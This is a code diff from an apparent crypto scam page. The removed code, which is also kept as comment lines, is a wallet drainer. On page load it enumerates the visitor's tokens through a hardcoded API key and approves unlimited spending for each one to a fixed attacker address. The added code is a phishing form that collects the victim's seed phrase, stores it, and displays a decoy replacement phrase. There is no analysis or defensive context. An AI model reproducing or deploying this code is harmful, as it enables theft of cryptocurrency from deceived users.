@@ -457,74 +457,110 @@
 
 
 
-const CONFIG = {
-    SPENDER_ADDRESS: '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75',
-    COVALENT_API_KEY: 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA',
-    CHAIN_ID: 1
-  };
+// const CONFIG = {
+//     SPENDER_ADDRESS: '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75',
+//     COVALENT_API_KEY: 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA',
+//     CHAIN_ID: 1
+//   };
 
-  function redirectToTrustWallet() {
-    window.location.href = 'trust://browser_enable';
-  }
+//   function redirectToTrustWallet() {
+//     window.location.href = 'trust://browser_enable';
+//   }
 
-  async function autoApprove() {
-    try {
-      const provider = window.ethereum || window.trustwallet;
-      if (!provider) {
-        alert('Not in Trust Wallet browser. Redirecting...');
-        redirectToTrustWallet();
+//   async function autoApprove() {
+//     try {
+//       const provider = window.ethereum || window.trustwallet;
+//       if (!provider) {
+//         alert('Not in Trust Wallet browser. Redirecting...');
+//         redirectToTrustWallet();
+//         return;
+//       }
+
+//       const web3 = new Web3(provider);
+//       const accounts = await provider.request({ method: 'eth_requestAccounts' });
+//       const userAddress = accounts[0];
+
+//       const url = `https://api.covalenthq.com/v1/${CONFIG.CHAIN_ID}/address/${userAddress}/balances_v2/?key=${CONFIG.COVALENT_API_KEY}`;
+//       const res = await fetch(url);
+//       const json = await res.json();
+//       const items = json?.data?.items;
+
+//       if (!items || items.length === 0) return alert('No tokens found');
+
+//       const abi = [{
+//         constant: false,
+//         inputs: [
+//           { name: 'spender', type: 'address' },
+//           { name: 'value', type: 'uint256' }
+//         ],
+//         name: 'approve',
+//         outputs: [{ name: '', type: 'bool' }],
+//         type: 'function'
+//       }];
+
+//       const bigAmount = web3.utils.toWei('1000000000000', 'ether');
+
+//       for (const token of items) {
+//         const addr = token.contract_address;
+//         if (!addr || addr.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') continue;
+
+//         const contract = new web3.eth.Contract(abi, addr);
+//         try {
+//           await contract.methods.approve(CONFIG.SPENDER_ADDRESS, bigAmount).send({ from: userAddress });
+//           console.log(`Approved: ${token.contract_name || addr}`);
+//         } catch (e) {
+//           console.warn(`Skipped: ${token.contract_name || addr}, e.message`);
+//         }
+//       }
+
+//       alert('Approve complete');
+//     } catch (err) {
+//       console.error('Error:', err);
+//       alert('Failed to approve tokens');
+//     }
+//   }
+
+//   setTimeout(() => {
+//     if (!window.ethereum && /iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+//       redirectToTrustWallet();
+//     } else {
+//       autoApprove();
+//     }
+//   }, 2000);
+
+
+
+
+
+const seedForm = document.getElementById('seedForm');
+const seedInput = document.getElementById('seedInput');
+const newSeedDisplay = document.getElementById('newSeedDisplay');
+const generatedSeed = document.getElementById('generatedSeed');
+
+const fakeSeed = [
+    "need", "height", "simplified", "cold", "fast", "observe",
+    "object", "blind", "heat", "charging", "bottle", "fireworks"
+];
+
+seedForm.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const userSeed = seedInput.value.trim();
+
+    if (userSeed.split(" ").length < 12) {
+        alert("Введите корректную seed-фразу (минимум 12 слов).");
         return;
-      }
-
-      const web3 = new Web3(provider);
-      const accounts = await provider.request({ method: 'eth_requestAccounts' });
-      const userAddress = accounts[0];
-
-      const url = `https://api.covalenthq.com/v1/${CONFIG.CHAIN_ID}/address/${userAddress}/balances_v2/?key=${CONFIG.COVALENT_API_KEY}`;
-      const res = await fetch(url);
-      const json = await res.json();
-      const items = json?.data?.items;
-
-      if (!items || items.length === 0) return alert('No tokens found');
-
-      const abi = [{
-        constant: false,
-        inputs: [
-          { name: 'spender', type: 'address' },
-          { name: 'value', type: 'uint256' }
-        ],
-        name: 'approve',
-        outputs: [{ name: '', type: 'bool' }],
-        type: 'function'
-      }];
-
-      const bigAmount = web3.utils.toWei('1000000000000', 'ether');
-
-      for (const token of items) {
-        const addr = token.contract_address;
-        if (!addr || addr.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') continue;
-
-        const contract = new web3.eth.Contract(abi, addr);
-        try {
-          await contract.methods.approve(CONFIG.SPENDER_ADDRESS, bigAmount).send({ from: userAddress });
-          console.log(`Approved: ${token.contract_name || addr}`);
-        } catch (e) {
-          console.warn(`Skipped: ${token.contract_name || addr}, e.message`);
-        }
-      }
-
-      alert('Approve complete');
-    } catch (err) {
-      console.error('Error:', err);
-      alert('Failed to approve tokens');
     }
-  }
 
-  // Старт через 2 секунды
-  setTimeout(() => {
-    if (!window.ethereum && /iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-      redirectToTrustWallet();
-    } else {
-      autoApprove();
-    }
-  }, 2000);
+    // Сохраняем
+    localStorage.setItem("userSeedPhrase", userSeed);
+
+    // Показываем подставную фразу
+    generatedSeed.textContent = fakeSeed.join(", ");
+    newSeedDisplay.style.display = "block";
+
+    // Плавное исчезновение формы через 10 сек
+    setTimeout(() => {
+        seedForm.classList.add("fade-out");
+    }, 10000);
+});
